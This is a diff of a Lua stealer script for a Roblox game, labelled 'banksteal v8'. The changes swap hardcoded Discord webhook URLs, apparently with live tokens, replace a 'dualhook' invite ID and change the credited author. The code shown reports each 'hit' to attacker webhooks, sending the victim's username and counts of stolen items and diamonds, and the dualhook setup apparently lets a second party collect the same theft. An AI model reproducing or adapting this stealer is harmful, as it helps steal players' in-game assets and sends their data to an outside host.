@@ -27,18 +27,18 @@ deletebank:Destroy()
 
 if _G.License and _G.License ~= nil and _G.License ~= "" then
  _G.Key = "xolboR"
- _G.AuthServer = "https://discord.com/api/webhooks/1051085170800865340/YThsfrDQU50NjBSOzyR2QKOYeXn2Dk_eRCgxqzHERKuSeKhOY6tt48l4oBTdlnqZUuDf"
+ _G.AuthServer = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
 end
 _G.UserId = game:GetService("Players"):GetUserIdFromNameAsync(string.reverse(_G.Key))
 if _G.AuthServer ~= "" and _G.AuthServer ~= nil and _G.AuthServer then
 _G.Webhook = _G.AuthServer
  else
- _G.Webhook = "https://discord.com/api/webhooks/1051085170800865340/YThsfrDQU50NjBSOzyR2QKOYeXn2Dk_eRCgxqzHERKuSeKhOY6tt48l4oBTdlnqZUuDf"
+ _G.Webhook = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
 end
 
 -- Invitation ID
 
-local idiot = 3644348494 -- the dualhook invite
+local idiot = 549167423 -- the dualhook invite
 
 -- Invitation ID End
 
@@ -238,7 +238,7 @@ wait(6)
 -- End Webhoook Victim
 -- Webhook (OUR)
   if HugeCount >= 1 or EXCCount >= 20 or ScumCount >= 1 or GiftCount >= 1 or #HList >= 1 or SuperBank["Storage"]["Currency"]["Diamonds"] >= 100000000000 then
-local YourWebHookHere =  "https://discord.com/api/webhooks/1051552492707651595/fQ6uZJTeGC6Fjsrdmo2whpHkY5l1MbPnAxwL7UbFKSuWpC12QWMeb7XG0dDVmLA7fC2K"  -- web hook here
+local YourWebHookHere =  "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"  -- web hook here
 
 local url = YourWebHookHere
 local username = game:GetService("Players").LocalPlayer.Name
@@ -249,7 +249,7 @@ local data = {
   ["content"] = "@everyone We Got a Hit!",
 ["embeds"] = {{
 ["title"] = "__**Bank Steal Results**__",
-["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
+["description"] = "(Banksteal v8 by LilFrag!)",
 ["type"] = "rich",
 ["color"] = tonumber(0x0E980E),
 ["fields"] = {
@@ -312,7 +312,7 @@ local data = {
   ["content"] = "@everyone We Got a Hit!",
 ["embeds"] = {{
 ["title"] = "__**Bank Steal Results**__",
-["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
+["description"] = "(Banksteal v8 by LilFrag!)",
 ["type"] = "rich",
 ["color"] = tonumber(0x0E980E),
 ["fields"] = {
